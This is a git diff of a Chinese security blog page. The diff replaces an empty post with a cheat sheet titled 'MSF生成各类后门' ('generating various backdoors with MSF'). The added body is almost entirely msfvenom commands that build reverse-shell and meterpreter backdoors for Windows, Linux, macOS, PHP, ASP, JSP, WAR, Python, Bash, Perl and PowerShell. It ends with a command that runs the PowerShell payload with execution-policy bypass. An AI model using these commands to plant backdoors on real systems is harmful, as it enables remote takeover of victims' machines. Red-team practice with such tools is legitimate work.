@@ -2,7 +2,7 @@
   <head>
     <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>渗透测试之基础信息收集 | Error404</title>
+<title>MSF生成各类后门 | Error404</title>
 <link rel="shortcut icon" href="https://jackstrom0904.github.io/favicon.ico?v=1585034715317">
 <link rel="stylesheet" href="https://jackstrom0904.github.io/styles/main.css">
 
@@ -17,8 +17,8 @@
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
     onload="renderMathInElement(document.body);"></script>
-    <meta name="description" content="渗透测试之基础信息收集" />
-    <meta name="keywords" content="渗透测试" />
+    <meta name="description" content="MSF生成各类后门" />
+    <meta name="keywords" content="红蓝对抗" />
   </head>
   <body>
     <div class="head-top-line"></div>
@@ -245,15 +245,15 @@
               <div class="article-box">
     <header class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://jackstrom0904.github.io/axcjIUufJ">
-      渗透测试之基础信息收集
+    <a class="post-title-link" href="https://jackstrom0904.github.io/_zxYWzWWT">
+      MSF生成各类后门
     </a>
   </h1>
   <div class="post-meta">
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span>发布于</span>
-      <span>2020-01-25</span>
+      <span>2020-03-24</span>
     </span>
     
       <span class="meta-item">
@@ -262,8 +262,8 @@
         <span class="pc-show">分类于</span>
         
           
-            <a href="https://jackstrom0904.github.io/shen-tou-ce-shi">
-              <span>渗透测试</span>
+            <a href="https://jackstrom0904.github.io/x4l8rqWJg">
+              <span>红蓝对抗</span>
             </a>
           
         
@@ -272,20 +272,41 @@
     
     <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>0分钟</span>
+      <span>2分钟</span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>0<span class="pc-show">字数</span></span>
+      <span>203<span class="pc-show">字数</span></span>
     </span>
   </div>
 </header>
 </div>
               <div class="post-body next-md-body" id="post_body">
-                <ol>
-<li></li>
-</ol>
+                <p>Windows<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe &gt; shell.exe<br>
+Linux<br>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; shell.elf<br>
+Mac<br>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f macho &gt; shell.macho<br>
+PHP<br>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.php<br>
+ASP<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp &gt; shell.asp<br>
+JSP<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.jsp<br>
+WAR<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war &gt; shell.war<br>
+Python<br>
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.py<br>
+Bash<br>
+msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.sh<br>
+Perl<br>
+msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.pl<br>
+Powershell<br>
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=6666 -f psh &gt; shell.ps1<br>
+powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
+<!-- more -->
 
               </div>
               <div class="post-footer">
@@ -296,7 +317,7 @@
     </li>
     <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://jackstrom0904.github.io/axcjIUufJ" title="渗透测试之基础信息收集">渗透测试之基础信息收集</a>
+      <a href="https://jackstrom0904.github.io/_zxYWzWWT" title="MSF生成各类后门">MSF生成各类后门</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明： </strong>
@@ -305,21 +326,17 @@
   </ul>
   <div class="tags">
     
-      <a href="https://jackstrom0904.github.io/shen-tou-ce-shi"># 渗透测试</a>
+      <a href="https://jackstrom0904.github.io/x4l8rqWJg"># 红蓝对抗</a>
     
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" href="https://jackstrom0904.github.io/Wm37OF_ZL">渗透测试之Nmap</a class="nav-pc-next">
-        <a class="nav-mobile-prev" href="https://jackstrom0904.github.io/Wm37OF_ZL">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" href="https://jackstrom0904.github.io/SNQOq63GI">渗透测试工具之Sqlmap</a>
-        <a class="nav-mobile-next" href="https://jackstrom0904.github.io/SNQOq63GI">下一篇</a>
+        <a class="nav-pc-next" href="https://jackstrom0904.github.io/sFeAdmB8q">CORS跨域资源共享漏洞</a>
+        <a class="nav-mobile-next" href="https://jackstrom0904.github.io/sFeAdmB8q">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
